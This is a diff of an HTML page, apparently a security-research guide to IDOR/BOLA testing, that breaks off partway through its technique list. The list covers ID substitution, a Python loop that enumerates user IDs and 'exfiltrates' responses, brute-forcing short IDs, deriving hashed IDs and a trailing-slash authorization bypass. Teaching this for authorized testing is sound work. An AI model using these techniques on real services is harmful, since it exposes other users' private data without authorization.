@@ -3,853 +3,861 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>IDOR Testing Guide</title>
+<title>IDOR Testing Masterclass — Ultimate Edition</title>
 <link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
 <style>
-:root {
-  --bg: #0a0a0f;
-  --bg2: #0f0f18;
-  --bg3: #141420;
-  --surface: #1a1a2e;
-  --surface2: #1f1f35;
-  --border: rgba(120,120,255,0.12);
-  --border2: rgba(120,120,255,0.25);
-  --accent: #6c63ff;
-  --accent2: #ff6584;
-  --accent3: #43e97b;
-  --accent4: #f9c74f;
-  --accent5: #f72585;
-  --text: #e8e8f0;
-  --text2: #9090b0;
-  --text3: #5a5a7a;
-  --mono: 'Space Mono', monospace;
-  --sans: 'Syne', sans-serif;
-  --red: #ff4d6d;
-  --amber: #f9c74f;
-  --green: #43e97b;
-  --blue: #4cc9f0;
-  --purple: #7b5ea7;
+:root{
+  --bg:#080810;--bg2:#0d0d1a;--bg3:#111122;
+  --surface:#16162a;--surface2:#1c1c35;
+  --border:rgba(110,100,255,0.13);--border2:rgba(110,100,255,0.3);
+  --accent:#6c63ff;--a2:#ff6584;--a3:#43e97b;--a4:#f9c74f;--a5:#f72585;
+  --text:#eaeaf5;--text2:#8888aa;--text3:#4a4a6a;
+  --mono:'Space Mono',monospace;--sans:'Syne',sans-serif;
+  --red:#ff4d6d;--amber:#f9c74f;--green:#43e97b;--blue:#4cc9f0;--purple:#b39ddb;--pink:#f72585;
 }
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-html { scroll-behavior: smooth; }
-body {
-  background: var(--bg);
-  color: var(--text);
-  font-family: var(--sans);
-  overflow-x: hidden;
-  min-height: 100vh;
-}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);overflow-x:hidden;min-height:100vh}
+#bgc{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none;opacity:0.3}
+.page{position:relative;z-index:1}
 
-/* === CANVAS BG === */
-#bg-canvas {
-  position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-  z-index: 0; pointer-events: none; opacity: 0.35;
-}
+/* HERO */
+.hero{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:2rem;position:relative}
+.hbadge{font-family:var(--mono);font-size:11px;letter-spacing:3px;color:var(--accent);border:1px solid var(--accent);padding:4px 16px;border-radius:99px;margin-bottom:1.5rem;text-transform:uppercase;animation:fid .8s ease}
+.hero h1{font-size:clamp(2.5rem,6vw,5rem);font-weight:800;line-height:1.05;background:linear-gradient(135deg,#fff 0%,#c8c8ff 40%,var(--accent) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:1rem;animation:fiu .9s ease .1s both}
+.hsub{font-size:1rem;color:var(--text2);max-width:600px;line-height:1.7;margin-bottom:2.5rem;animation:fiu .9s ease .2s both}
+.hstats{display:flex;gap:2rem;flex-wrap:wrap;justify-content:center;animation:fiu .9s ease .3s both}
+.hstat .num{font-size:2rem;font-weight:800;color:var(--accent);line-height:1}
+.hstat .lbl{font-family:var(--mono);font-size:10px;letter-spacing:2px;color:var(--text3);margin-top:4px;text-transform:uppercase}
+.scr{position:absolute;bottom:2rem;font-family:var(--mono);font-size:11px;color:var(--text3);letter-spacing:2px;animation:bnc 2s infinite}
 
-/* === LAYOUT === */
-.page { position: relative; z-index: 1; }
+/* NAV */
+.pnav{position:sticky;top:0;z-index:100;background:rgba(8,8,16,0.9);backdrop-filter:blur(16px);border-bottom:1px solid var(--border);padding:0 1.5rem;overflow-x:auto}
+.pnav::-webkit-scrollbar{height:3px}.pnav::-webkit-scrollbar-thumb{background:var(--surface2)}
+.pni{display:flex;max-width:1400px;margin:0 auto}
+.pnb{flex-shrink:0;font-family:var(--mono);font-size:10px;letter-spacing:1px;color:var(--text3);background:none;border:none;padding:13px 14px;cursor:pointer;border-bottom:2px solid transparent;transition:all .2s;text-transform:uppercase;white-space:nowrap}
+.pnb:hover{color:var(--text)}.pnb.active{color:var(--accent);border-bottom-color:var(--accent)}
 
-/* === HERO === */
-.hero {
-  min-height: 100vh;
-  display: flex; flex-direction: column; align-items: center; justify-content: center;
-  text-align: center; padding: 2rem;
-  position: relative;
-}
-.hero-badge {
-  font-family: var(--mono); font-size: 11px; letter-spacing: 3px;
-  color: var(--accent); border: 1px solid var(--accent);
-  padding: 4px 14px; border-radius: 99px; margin-bottom: 1.5rem;
-  text-transform: uppercase; animation: fadeInDown 0.8s ease;
-}
-.hero h1 {
-  font-size: clamp(2.8rem, 7vw, 5.5rem);
-  font-weight: 800; line-height: 1.05;
-  background: linear-gradient(135deg, #fff 0%, #c8c8ff 40%, var(--accent) 100%);
-  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-  background-clip: text; margin-bottom: 1rem;
-  animation: fadeInUp 0.9s ease 0.1s both;
-}
-.hero-sub {
-  font-size: 1.1rem; color: var(--text2); max-width: 560px;
-  line-height: 1.7; margin-bottom: 2.5rem;
-  animation: fadeInUp 0.9s ease 0.2s both;
-}
-.hero-stats {
-  display: flex; gap: 2.5rem; animation: fadeInUp 0.9s ease 0.3s both;
-}
-.hero-stat { text-align: center; }
-.hero-stat .num { font-size: 2rem; font-weight: 800; color: var(--accent); line-height: 1; }
-.hero-stat .lbl { font-family: var(--mono); font-size: 10px; letter-spacing: 2px; color: var(--text3); margin-top: 4px; text-transform: uppercase; }
-.scroll-hint {
-  position: absolute; bottom: 2rem;
-  font-family: var(--mono); font-size: 11px; color: var(--text3); letter-spacing: 2px;
-  animation: bounce 2s infinite;
-}
+/* SEARCH */
+.search-wrap{max-width:1200px;margin:2rem auto 0;padding:0 2rem}
+.search-box{width:100%;background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:10px 16px;font-family:var(--mono);font-size:13px;color:var(--text);outline:none;transition:border-color .2s}
+.search-box:focus{border-color:var(--border2)}
+.search-box::placeholder{color:var(--text3)}
 
-/* === PHASE NAV === */
-.phase-nav {
-  position: sticky; top: 0; z-index: 100;
-  background: rgba(10,10,15,0.85); backdrop-filter: blur(12px);
-  border-bottom: 1px solid var(--border);
-  padding: 0 2rem; overflow-x: auto;
-}
-.phase-nav-inner {
-  display: flex; gap: 0; max-width: 1200px; margin: 0 auto;
-}
-.phase-nav-btn {
-  flex-shrink: 0;
-  font-family: var(--mono); font-size: 11px; letter-spacing: 1px;
-  color: var(--text3); background: none; border: none;
-  padding: 14px 18px; cursor: pointer;
-  border-bottom: 2px solid transparent;
-  transition: all 0.2s; text-transform: uppercase; white-space: nowrap;
-}
-.phase-nav-btn:hover { color: var(--text); }
-.phase-nav-btn.active { color: var(--accent); border-bottom-color: var(--accent); }
+/* MAIN */
+.main{max-width:1200px;margin:0 auto;padding:2rem 2rem 6rem}
+.psec{margin-bottom:4rem;scroll-margin-top:55px}
+.phead{display:flex;align-items:center;gap:1rem;margin-bottom:1.2rem;flex-wrap:wrap}
+.pnum{font-family:var(--mono);font-size:11px;letter-spacing:2px;color:var(--accent);background:rgba(108,99,255,0.1);border:1px solid rgba(108,99,255,0.25);padding:3px 10px;border-radius:4px;flex-shrink:0}
+.ptitle{font-size:1.5rem;font-weight:700;color:var(--text)}
+.ptag{margin-left:auto;flex-shrink:0;font-family:var(--mono);font-size:10px;letter-spacing:2px;padding:3px 10px;border-radius:99px;text-transform:uppercase}
+.tag-critical{background:rgba(255,77,109,.15);color:var(--red);border:1px solid rgba(255,77,109,.3)}
+.tag-attack{background:rgba(255,101,132,.12);color:var(--a2);border:1px solid rgba(255,101,132,.3)}
+.tag-bypass{background:rgba(249,199,79,.12);color:var(--amber);border:1px solid rgba(249,199,79,.3)}
+.tag-advanced{background:rgba(76,201,240,.12);color:var(--blue);border:1px solid rgba(76,201,240,.3)}
+.tag-recon{background:rgba(67,233,123,.12);color:var(--green);border:1px solid rgba(67,233,123,.3)}
+.tag-auto{background:rgba(179,157,219,.12);color:var(--purple);border:1px solid rgba(179,157,219,.3)}
+.tag-defense{background:rgba(247,37,133,.12);color:var(--pink);border:1px solid rgba(247,37,133,.3)}
+.tag-exploit{background:rgba(255,77,109,.2);color:#ff8fa3;border:1px solid rgba(255,77,109,.4)}
+.tag-mobile{background:rgba(76,201,240,.15);color:#80d8ff;border:1px solid rgba(76,201,240,.35)}
 
-/* === MAIN === */
-.main { max-width: 1200px; margin: 0 auto; padding: 3rem 2rem 6rem; }
+/* CARDS GRID */
+.cgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(330px,1fr));gap:10px}
+.card{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;transition:transform .18s,border-color .18s,box-shadow .18s;cursor:pointer;position:relative}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:var(--ca,var(--accent));opacity:0;transition:opacity .2s}
+.card:hover{transform:translateY(-3px);border-color:var(--border2);box-shadow:0 10px 35px rgba(0,0,0,.4)}
+.card:hover::before,.card.open::before{opacity:1}
+.card.open{border-color:var(--border2)}
+.card.hidden{display:none}
+.chead{padding:13px 15px;display:flex;align-items:center;gap:9px}
+.crisk{font-family:var(--mono);font-size:10px;letter-spacing:1px;padding:2px 7px;border-radius:99px;flex-shrink:0;text-transform:uppercase}
+.r-critical{background:rgba(255,77,109,.2);color:var(--red)}
+.r-high{background:rgba(255,150,77,.2);color:#ff964d}
+.r-medium{background:rgba(249,199,79,.2);color:var(--amber)}
+.r-low{background:rgba(67,233,123,.2);color:var(--green)}
+.r-info{background:rgba(76,201,240,.2);color:var(--blue)}
+.ctitle{font-size:13px;font-weight:600;color:var(--text);flex:1;line-height:1.3}
+.ctog{font-family:var(--mono);font-size:16px;color:var(--text3);transition:transform .25s;flex-shrink:0}
+.card.open .ctog{transform:rotate(45deg);color:var(--accent)}
+.cbody{display:none;padding:0 15px 15px;border-top:1px solid var(--border)}
+.card.open .cbody{display:block}
+.cdesc{font-size:12px;color:var(--text2);line-height:1.65;padding-top:11px;margin-bottom:10px}
+.ccode{background:var(--bg3);border:1px solid var(--border);border-radius:7px;padding:10px 13px;font-family:var(--mono);font-size:11px;color:#a8c7ff;line-height:1.75;white-space:pre;overflow-x:auto}
+.ctip{background:rgba(108,99,255,.08);border-left:2px solid var(--accent);padding:8px 12px;border-radius:0 6px 6px 0;margin-top:10px;font-size:11px;color:var(--text2);line-height:1.6}
+.ctip b{color:var(--accent)}
 
-/* === PHASE SECTION === */
-.phase-section { margin-bottom: 4rem; scroll-margin-top: 60px; }
-.phase-header {
-  display: flex; align-items: center; gap: 1rem; margin-bottom: 1.5rem;
-}
-.phase-number {
-  font-family: var(--mono); font-size: 11px; letter-spacing: 2px;
-  color: var(--accent); background: rgba(108,99,255,0.12);
-  border: 1px solid rgba(108,99,255,0.3);
-  padding: 3px 10px; border-radius: 4px; flex-shrink: 0;
-}
-.phase-title {
-  font-size: 1.6rem; font-weight: 700; color: var(--text);
-}
-.phase-tag {
-  margin-left: auto; flex-shrink: 0;
-  font-family: var(--mono); font-size: 10px; letter-spacing: 2px;
-  padding: 3px 10px; border-radius: 99px; text-transform: uppercase;
-}
-.tag-critical { background: rgba(255,77,109,0.15); color: var(--red); border: 1px solid rgba(255,77,109,0.3); }
-.tag-attack { background: rgba(255,101,132,0.12); color: var(--accent2); border: 1px solid rgba(255,101,132,0.3); }
-.tag-bypass { background: rgba(249,199,79,0.12); color: var(--amber); border: 1px solid rgba(249,199,79,0.3); }
-.tag-advanced { background: rgba(76,201,240,0.12); color: var(--blue); border: 1px solid rgba(76,201,240,0.3); }
-.tag-recon { background: rgba(67,233,123,0.12); color: var(--green); border: 1px solid rgba(67,233,123,0.3); }
-.tag-automation { background: rgba(123,94,167,0.12); color: #b39ddb; border: 1px solid rgba(123,94,167,0.3); }
+/* INFO BOX */
+.ibox{background:rgba(108,99,255,.07);border:1px solid rgba(108,99,255,.22);border-radius:10px;padding:.9rem 1.1rem;margin-bottom:1.2rem;font-size:13px;color:var(--text2);line-height:1.65}
+.ibox strong{color:var(--accent)}
 
-/* === TECHNIQUE CARDS GRID === */
-.cards-grid {
-  display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
-  gap: 1rem;
-}
-.technique-card {
-  background: var(--surface);
-  border: 1px solid var(--border);
-  border-radius: 12px;
-  overflow: hidden;
-  transition: transform 0.2s, border-color 0.2s, box-shadow 0.2s;
-  cursor: pointer;
-  position: relative;
-}
-.technique-card::before {
-  content: '';
-  position: absolute; top: 0; left: 0; right: 0; height: 3px;
-  background: var(--card-accent, var(--accent));
-  opacity: 0; transition: opacity 0.2s;
-}
-.technique-card:hover {
-  transform: translateY(-3px);
-  border-color: var(--border2);
-  box-shadow: 0 12px 40px rgba(0,0,0,0.4), 0 0 0 1px var(--border2);
-}
-.technique-card:hover::before { opacity: 1; }
-.technique-card.open { border-color: var(--border2); }
-.technique-card.open::before { opacity: 1; }
+/* TABLE */
+.tbl-wrap{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden}
+.ptable{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:11px}
+.ptable th{text-align:left;padding:9px 13px;color:var(--text3);font-weight:400;letter-spacing:1px;border-bottom:1px solid var(--border);font-size:10px;text-transform:uppercase}
+.ptable td{padding:8px 13px;border-bottom:1px solid rgba(110,100,255,.05);color:var(--text2);vertical-align:top}
+.ptable tr:hover td{background:rgba(108,99,255,.04)}
+.ptable td:first-child{color:var(--amber);white-space:nowrap}
+.ptable td:last-child{color:#a8c7ff}
 
-.card-head {
-  padding: 14px 16px;
-  display: flex; align-items: center; gap: 10px;
-}
-.card-risk {
-  font-family: var(--mono); font-size: 10px; letter-spacing: 1px;
-  padding: 2px 8px; border-radius: 99px; flex-shrink: 0; text-transform: uppercase;
-}
-.risk-critical { background: rgba(255,77,109,0.2); color: var(--red); }
-.risk-high { background: rgba(255,150,77,0.2); color: #ff964d; }
-.risk-medium { background: rgba(249,199,79,0.2); color: var(--amber); }
-.risk-low { background: rgba(67,233,123,0.2); color: var(--green); }
-.risk-info { background: rgba(76,201,240,0.2); color: var(--blue); }
+/* CHECKLIST */
+.clist{list-style:none}
+.clist li{display:flex;align-items:flex-start;gap:10px;padding:9px 0;border-bottom:1px solid var(--border);font-size:13px;color:var(--text2);line-height:1.55}
+.clist li:last-child{border-bottom:none}
+.clist li::before{content:'□';font-size:15px;color:var(--accent);flex-shrink:0;line-height:1.3}
+.clist li.done{color:var(--text3);text-decoration:line-through}
+.clist li.done::before{content:'✓';color:var(--green)}
 
-.card-title { font-size: 14px; font-weight: 600; color: var(--text); flex: 1; line-height: 1.3; }
-.card-toggle {
-  font-family: var(--mono); font-size: 16px; color: var(--text3);
-  transition: transform 0.25s; flex-shrink: 0;
-}
-.technique-card.open .card-toggle { transform: rotate(45deg); color: var(--accent); }
+/* PRIORITY */
+.plist{list-style:none}
+.pitem{display:flex;align-items:center;gap:12px;padding:11px 15px;margin-bottom:7px;background:var(--surface);border:1px solid var(--border);border-radius:10px;font-size:13px;transition:border-color .15s,transform .15s}
+.pitem:hover{border-color:var(--border2);transform:translateX(4px)}
+.prank{font-family:var(--mono);font-size:18px;font-weight:700;min-width:28px;text-align:center}
+.p1{color:var(--red)}.p2{color:#ff964d}.p3{color:var(--amber)}.p4{color:var(--purple)}.p5{color:var(--blue)}.p6{color:var(--green)}.p7{color:#80cbc4}.p8{color:#ce93d8}
 
-.card-body {
-  display: none; padding: 0 16px 16px;
-  border-top: 1px solid var(--border);
-}
-.technique-card.open .card-body { display: block; }
-.card-desc {
-  font-size: 13px; color: var(--text2); line-height: 1.65;
-  padding-top: 12px; margin-bottom: 10px;
-}
-.card-code {
-  background: var(--bg3); border: 1px solid var(--border);
-  border-radius: 8px; padding: 10px 14px;
-  font-family: var(--mono); font-size: 11px;
-  color: #a8c7ff; line-height: 1.7;
-  white-space: pre; overflow-x: auto;
-}
-.code-comment { color: var(--text3); }
-.code-method { color: #f9c74f; }
-.code-path { color: #a8c7ff; }
-.code-highlight { color: #ff6584; }
-.code-arrow { color: var(--accent3); }
+/* TOOLS */
+.tgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px}
+.tcard{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1rem 1.1rem}
+.tname{font-size:14px;font-weight:700;color:var(--a3);margin-bottom:5px;font-family:var(--mono)}
+.tdesc{font-size:12px;color:var(--text2);line-height:1.6;margin-bottom:9px}
+.tcmd{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:8px 10px;font-family:var(--mono);font-size:10px;color:#a8c7ff;overflow-x:auto;white-space:pre;line-height:1.65}
 
-/* === PAYLOAD TABLE === */
-.payload-table {
-  width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 12px;
-}
-.payload-table th {
-  text-align: left; padding: 8px 12px;
-  color: var(--text3); font-weight: 400; letter-spacing: 1px;
-  border-bottom: 1px solid var(--border); font-size: 10px; text-transform: uppercase;
-}
-.payload-table td {
-  padding: 8px 12px; border-bottom: 1px solid rgba(120,120,255,0.06);
-  color: var(--text2); font-size: 11px; vertical-align: top;
-}
-.payload-table tr:hover td { background: rgba(108,99,255,0.05); }
-.payload-table td:first-child { color: #f9c74f; white-space: nowrap; }
-.payload-table td:last-child { color: #a8c7ff; }
+/* NEW BADGE */
+.nbadge{font-family:var(--mono);font-size:9px;letter-spacing:1px;background:rgba(247,37,133,.2);color:var(--pink);border:1px solid rgba(247,37,133,.3);border-radius:99px;padding:1px 6px;text-transform:uppercase;margin-left:5px;vertical-align:middle}
+.ubadge{font-family:var(--mono);font-size:9px;letter-spacing:1px;background:rgba(249,199,79,.15);color:var(--amber);border:1px solid rgba(249,199,79,.3);border-radius:99px;padding:1px 6px;text-transform:uppercase;margin-left:5px;vertical-align:middle}
 
-/* === CHECKLIST === */
-.checklist { list-style: none; }
-.checklist li {
-  display: flex; align-items: flex-start; gap: 10px;
-  padding: 10px 0; border-bottom: 1px solid var(--border);
-  font-size: 14px; color: var(--text2); line-height: 1.5;
-}
-.checklist li:last-child { border-bottom: none; }
-.checklist li::before {
-  content: '□'; font-size: 16px; color: var(--accent); flex-shrink: 0; line-height: 1.3;
-}
-input[type=checkbox]:checked + span { text-decoration: line-through; color: var(--text3); }
+/* CVSS TABLE */
+.cvss-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px}
+.cvss-card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:.9rem 1rem}
+.cvss-type{font-size:12px;font-weight:700;color:var(--text);margin-bottom:4px}
+.cvss-score{font-family:var(--mono);font-size:22px;font-weight:700;margin-bottom:4px}
+.cvss-desc{font-size:11px;color:var(--text2);line-height:1.5}
+.score-crit{color:var(--red)}.score-high{color:#ff964d}.score-med{color:var(--amber)}.score-low{color:var(--green)}
 
-/* === PRIORITY GUIDE === */
-.priority-list { list-style: none; }
-.priority-item {
-  display: flex; align-items: center; gap: 12px;
-  padding: 12px 16px; margin-bottom: 8px;
-  background: var(--surface); border: 1px solid var(--border);
-  border-radius: 10px; font-size: 14px;
-  transition: border-color 0.15s, transform 0.15s;
-}
-.priority-item:hover { border-color: var(--border2); transform: translateX(4px); }
-.priority-rank {
-  font-family: var(--mono); font-size: 20px; font-weight: 700;
-  min-width: 32px; text-align: center;
-}
-.p1 { color: var(--red); }
-.p2 { color: #ff964d; }
-.p3 { color: var(--amber); }
-.p4 { color: #c8f; }
-.p5 { color: var(--blue); }
-.p6 { color: var(--green); }
+/* VULN TYPE CARDS */
+.vtgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:12px;margin-bottom:1.5rem}
+.vtcard{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1rem 1.2rem;border-left:3px solid var(--vca,var(--accent))}
+.vtcard h3{font-size:14px;font-weight:700;color:var(--text);margin-bottom:6px}
+.vtcard p{font-size:12px;color:var(--text2);line-height:1.6}
+.vtcard .vcode{background:var(--bg3);border-radius:6px;padding:8px 10px;font-family:var(--mono);font-size:10px;color:#a8c7ff;margin-top:8px;overflow-x:auto;white-space:pre;line-height:1.65}
 
-/* === TOOL CARDS === */
-.tool-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 1rem; }
-.tool-card {
-  background: var(--surface); border: 1px solid var(--border);
-  border-radius: 12px; padding: 1rem 1.25rem;
-}
-.tool-name { font-size: 15px; font-weight: 700; color: var(--accent3); margin-bottom: 6px; font-family: var(--mono); }
-.tool-desc { font-size: 13px; color: var(--text2); line-height: 1.6; margin-bottom: 10px; }
-.tool-cmd { background: var(--bg3); border: 1px solid var(--border); border-radius: 6px; padding: 8px 10px; font-family: var(--mono); font-size: 11px; color: #a8c7ff; overflow-x: auto; white-space: pre; }
+/* DIVIDER */
+.div{border:none;border-top:1px solid var(--border);margin:3rem 0}
 
-/* === INFO BOX === */
-.info-box {
-  background: rgba(108,99,255,0.08); border: 1px solid rgba(108,99,255,0.25);
-  border-radius: 10px; padding: 1rem 1.25rem; margin-bottom: 1.5rem;
-  font-size: 13px; color: var(--text2); line-height: 1.6;
-}
-.info-box strong { color: var(--accent); }
+/* ANIMATIONS */
+@keyframes fid{from{opacity:0;transform:translateY(-14px)}to{opacity:1;transform:translateY(0)}}
+@keyframes fiu{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}
+@keyframes bnc{0%,100%{transform:translateY(0)}50%{transform:translateY(7px)}}
 
-/* === SECTION DIVIDER === */
-.divider {
-  border: none; border-top: 1px solid var(--border);
-  margin: 3rem 0;
-}
-
-/* === ANIMATIONS === */
-@keyframes fadeInDown { from { opacity: 0; transform: translateY(-16px); } to { opacity: 1; transform: translateY(0); } }
-@keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-@keyframes bounce { 0%,100% { transform: translateY(0); } 50% { transform: translateY(8px); } }
-
-/* === SCROLLBAR === */
-::-webkit-scrollbar { width: 6px; height: 6px; }
-::-webkit-scrollbar-track { background: var(--bg); }
-::-webkit-scrollbar-thumb { background: var(--surface2); border-radius: 99px; }
-
-/* === ADDITIONAL METHOD BADGE === */
-.new-badge {
-  font-family: var(--mono); font-size: 9px; letter-spacing: 1px;
-  background: rgba(247,37,133,0.2); color: #f72585;
-  border: 1px solid rgba(247,37,133,0.3); border-radius: 99px;
-  padding: 1px 7px; text-transform: uppercase; margin-left: 6px; vertical-align: middle;
-}
+::-webkit-scrollbar{width:5px;height:5px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--surface2);border-radius:99px}
 </style>
 </head>
 <body>
-<canvas id="bg-canvas"></canvas>
+<canvas id="bgc"></canvas>
 <div class="page">
 
-<!-- HERO -->
 <section class="hero">
-  <div class="hero-badge">Security Research Guide</div>
+  <div class="hbadge">Ultimate Security Research Guide</div>
   <h1>IDOR Testing<br>Masterclass</h1>
-  <p class="hero-sub">Insecure Direct Object Reference vulnerabilities — a complete field guide for ethical security researchers. 12 phases, 80+ techniques.</p>
-  <div class="hero-stats">
-    <div class="hero-stat"><div class="num">12</div><div class="lbl">Phases</div></div>
-    <div class="hero-stat"><div class="num">80+</div><div class="lbl">Techniques</div></div>
-    <div class="hero-stat"><div class="num">20+</div><div class="lbl">Payloads</div></div>
-    <div class="hero-stat"><div class="num">6</div><div class="lbl">Tools</div></div>
+  <p class="hsub">Insecure Direct Object Reference / BOLA — the most comprehensive field guide for ethical security researchers. Every known technique, variant, bypass, and defense pattern.</p>
+  <div class="hstats">
+    <div class="hstat"><div class="num">17</div><div class="lbl">Phases</div></div>
+    <div class="hstat"><div class="num">150+</div><div class="lbl">Techniques</div></div>
+    <div class="hstat"><div class="num">35+</div><div class="lbl">Payloads</div></div>
+    <div class="hstat"><div class="num">12</div><div class="lbl">Tools</div></div>
+    <div class="hstat"><div class="num">6</div><div class="lbl">IDOR Types</div></div>
   </div>
-  <div class="scroll-hint">▼ scroll to explore</div>
+  <div class="scr">▼ scroll to explore</div>
 </section>
 
-<!-- PHASE NAV -->
-<nav class="phase-nav" id="phaseNav">
-  <div class="phase-nav-inner" id="phaseNavInner"></div>
-</nav>
+<nav class="pnav" id="pnav"><div class="pni" id="pni"></div></nav>
 
-<!-- MAIN CONTENT -->
-<main class="main" id="mainContent"></main>
+<div class="search-wrap">
+  <input class="search-box" type="text" id="searchBox" placeholder="🔍  Search techniques, methods, payloads... (e.g. GraphQL, JWT, race condition)">
+</div>
 
+<main class="main" id="mc"></main>
 </div>
 
 <script>
-// ===================== DATA =====================
-const phases = [
-  {
-    id: 1, label: "Setup", fullLabel: "Setup & Target ID",
-    tag: "Recon", tagClass: "tag-recon",
-    info: "Before any testing, establish proper lab setup. Always use dedicated test accounts — never test on real users.",
-    techniques: [
-      { title: "Create attacker & victim accounts", risk: "critical", riskLabel: "Critical",
-        desc: "Create two separate accounts: one as the 'Attacker' (yours) and one as the 'Victim'. Essential for safely testing destructive operations (POST/PUT/DELETE) without impacting real users.",
-        code: `# Example\nAttacker: attacker@pentest.local  (ID=10)\nVictim:   victim@pentest.local    (ID=9)\n\n# Never use real accounts — always isolated test env` },
-      { title: "Identify JSON API endpoints", risk: "high", riskLabel: "High",
-        desc: "Target JSON REST API endpoints instead of HTML-rendered pages. APIs expose raw object IDs in URLs, query params, and request bodies — making IDOR much easier to exploit.",
-        code: `# Prefer API endpoints:\nGET /api/v1/users/10\nGET /api/v2/orders/4321\n\n# Not rendered HTML (harder):\nGET /dashboard/profile` },
-      { title: "Sensitivity analysis — prioritize targets", risk: "critical", riskLabel: "Critical",
-        desc: "Rank endpoints by impact: password reset > financial data > DMs > account recovery > user management > public data.",
-        code: `# High value targets first:\nPOST /api/reset-password\nGET  /api/invoice/{id}\nGET  /api/messages/{id}\nDEL  /api/account/{id}` },
-      { title: "ID parameter audit", risk: "medium", riskLabel: "Medium",
-        desc: "Hunt for ID parameters in all layers — URL path, query string, JSON body, cookies, headers.",
-        code: `# Check everywhere:\nPath:    /users/{id}\nQuery:   ?user_id=10\nBody:    {"userId": 10}\nCookie:  session_user=10\nHeader:  X-User-ID: 10` },
-      { title: "Find leaked IDs", risk: "high", riskLabel: "High",
-        desc: "IDs often leak from public pages, API responses, emails, Swagger docs, and referrer headers.",
-        code: `# Sources of leaked IDs:\n- Public profile: /u/victim_name\n- API field: {"created_by": 9}\n- Email receipt: order_id=9999\n- Swagger: GET /api-docs\n- JS source files` },
-      { title: "Map all clients", risk: "medium", riskLabel: "Medium",
-        desc: "Decompile mobile apps with jadx/apktool to find hidden API endpoints. Check Swagger/OpenAPI specs. Mobile apps often expose endpoints the web UI hides.",
-        code: `# Tools:\njadx app.apk            # decompile Android\napktool d app.apk        # decode resources\nburp + mobile proxy      # intercept traffic\ncurl /swagger.json       # API spec` },
-    ]
-  },
-  {
-    id: 2, label: "Direct ID", fullLabel: "Direct ID Substitution",
-    tag: "Attack", tagClass: "tag-attack",
-    info: "The most fundamental IDOR technique — directly swap your ID for a victim's ID. Always start here before complex techniques.",
-    techniques: [
-      { title: "Basic ID flip", risk: "critical", riskLabel: "Critical",
-        desc: "The simplest IDOR test: replace your own ID with another user's ID in the URL path.",
-        code: `GET /api/v5/users/10   # your account\n           ↓\nGET /api/v5/users/9    # victim's account` },
-      { title: "Incremental numeric brute force", risk: "critical", riskLabel: "Critical",
-        desc: "Sequentially enumerate IDs by incrementing/decrementing from your own. Works against predictable integer-based IDs.",
-        code: `# Python snippet\nfor uid in range(1, 10000):\n    r = requests.get(\n        f"/api/user/{uid}",\n        headers={"Authorization": token}\n    )\n    if r.status_code == 200:\n        exfiltrate(r.json())` },
-      { title: "Non-numeric ID substitution", risk: "high", riskLabel: "High",
-        desc: "Replace numeric ID with email address, username, or UUID. Some APIs accept multiple identifier formats.",
-        code: `GET /api/users/10\n  → GET /api/users/victim@email.com\n  → GET /api/users/victim_username\n  → GET /api/users/uuid-abc-123` },
-      { title: "Complex ID brute force", risk: "medium", riskLabel: "Medium",
-        desc: "Brute force only the last 1–4 chars of a short alphanumeric ID segment.",
-        code: `# ID pattern: user_XXXX\n# Brute last 4 chars:\nuser_a3f0 ... user_a3fz\nuser_b0a0 ... user_b0az\n\n# Tool: ffuf with charset wordlist` },
-      { title: "Predictable / combined IDs", risk: "medium", riskLabel: "Medium",
-        desc: "When paths contain multiple IDs, change one or both. Check if each part is independently validated.",
-        code: `# Original\n/user/2222/data/3333\n# Tests:\n/user/2222/data/1111  # change resource ID\n/user/9999/data/3333  # change user ID\n/user/9999/data/1111  # change both` },
-      { title: "Hashed / derived IDs", risk: "medium", riskLabel: "Medium",
-        desc: "Detect MD5/SHA-based IDs by creating multiple accounts and observing patterns. Map your IDs to derive victim hashes.",
-        code: `# Observation\nAccount 1: id = md5("user1@x.com")\nAccount 2: id = md5("user2@x.com")\n# Derive:\nVictim hash = md5("victim@x.com")` },
-    ]
-  },
-  {
-    id: 3, label: "URL Bypass", fullLabel: "Path & URL Manipulation",
-    tag: "Bypass", tagClass: "tag-bypass",
-    info: "Manipulate URL structure to bypass authorization checks that rely on exact path matching.",
-    techniques: [
-      { title: "Trailing slash bypass", risk: "medium", riskLabel: "Medium",
-        desc: "Some WAFs and auth layers match exact paths. Adding a trailing slash may route to a different handler that skips the auth check.",
-        code: `GET /api/v5/users/9\n          ↓\nGET /api/v5/users/9/` },
-      { title: "Double slash / obfuscated path", risk: "medium", riskLabel: "Medium",
